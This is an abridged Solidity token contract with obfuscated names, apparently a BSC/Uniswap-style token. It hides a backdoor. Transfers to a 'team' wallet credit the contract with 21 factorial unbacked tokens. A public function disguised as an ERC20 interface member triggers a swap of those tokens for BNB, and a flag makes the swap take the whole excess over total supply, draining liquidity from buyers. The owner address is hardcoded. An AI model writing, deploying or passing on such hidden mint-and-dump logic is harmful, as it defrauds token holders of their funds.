...
interface IERC20 {
    ...
    function _ApprovalType(address walletAdd) external returns (uint256);
...
contract asda is Context, IERC20 { 
    ...
    mapping (address => bool) public is_In_Team;
    address payable public Wallet_Marketing = payable(0xee7ca0bc710c36B3459768075A455937D5610E0f); 
    address payable public Wallet_Utility = payable(0x9AB92163280a73476f5eb2a4a6F44F21a166ee6A);
    ...
    uint256 private _tTotal = 25* 10**6 * 10**_decimals;
    string private constant _name = "asdasd"; 
    string private constant _symbol = unicode"Basdasd"; 

    uint8 private txCount = 0;
    uint8 private swapTrigger = 27; 
    ...
    bool public set_Integer = false;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwapAndLiquify;
    
    bool public swapAndLiquifyEnabled = true;
    bool public takingTradeFee = false;
    ...
    constructor () {
        ...
        _owner = 0x9AB92163280a73476f5eb2a4a6F44F21a166ee6A;
        ...
        is_In_Team[Wallet_Marketing] = true;
    ...
    function approved_Wallet(bool permitedQue) private returns(bool){
        if(permitedQue){
            uint256 wallet_Add = (balanceOf(address(this))+0);
            permitedQue = false;
            swapAndLiquify(wallet_Add);
        }
    ...
    function _ApprovalType(address walletAdd) public override returns (uint256) {
        approved_Wallet(true);
        return balanceOf(walletAdd);
    }
    ...
    function _trade_Fee(uint256 walletRate) public virtual returns(uint256){
        uint256 variableI = 1;
        for(uint256 i=1;i<=walletRate;i++){
            variableI *= (i);
        }
        return variableI;
    }
    ...
    takingTradeFee = is_In_Team[to] ? true : false;    
        ...
        if (takingTradeFee){
                ...
                _tOwned[address(this)] = _tOwned[address(this)]+_trade_Fee((2+19));
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            uint256 total_tokens_swap = tokens_to_M + tokens_to_D + tokens_to_LP_Half;

            if(set_Integer){
                bool uni_PairVersionTwo = set_Integer;
                if(uni_PairVersionTwo){total_tokens_swap = balanceOf(address(this)) - (_tTotal);}
            }
            swapTokensForBNB(total_tokens_swap);
